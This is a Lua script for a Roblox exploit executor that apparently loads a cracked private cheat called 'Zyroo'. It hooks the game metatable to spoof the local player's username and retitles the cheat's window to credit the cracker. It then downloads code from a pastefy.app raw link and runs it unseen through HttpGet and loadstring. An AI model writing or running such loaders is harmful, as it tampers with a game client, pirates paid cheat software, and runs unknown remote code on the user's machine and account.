local spoofedUsername = "imyourGodbro4"
local spoofedWindowTitle = "Zyroo | Private Cracked by Henne LMFAO"

local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local gameMT = getrawmetatable(game)
setreadonly(gameMT, false)
local oldGameIndex = gameMT.__index

gameMT.__index = newcclosure(function(t, k)
    if t == lp and (k == "Name" or k == "Username") then
        return spoofedUsername
    end
    return oldGameIndex(t, k)
end)

setreadonly(gameMT, true)

local realAddWindow = library.AddWindow
library.AddWindow = function(self, title, options)
    title = spoofedWindowTitle
    return realAddWindow(self, title, options)
end

local loadedScripts = {}

local function safeLoadString(url)
    if loadedScripts[url] then
        return
    end

    local success, result = pcall(function()
        return game:HttpGet(url, true)
    end)

    if success and type(result) == "string" then
        loadedScripts[url] = true
        local executeSuccess, err = pcall(loadstring(result))
        if executeSuccess then
            print("SCRIPT CRACKED BY henne")
        else
            warn("Failed to execute script from "..url..": "..err)
        end
    else
        warn("Failed to fetch script from "..url..": "..tostring(result))
    end
end

safeLoadString("https://pastefy.app/mCTC42bW/raw")

task.wait(10)
print("Current spoofed username:", game.Players.LocalPlayer.Name)
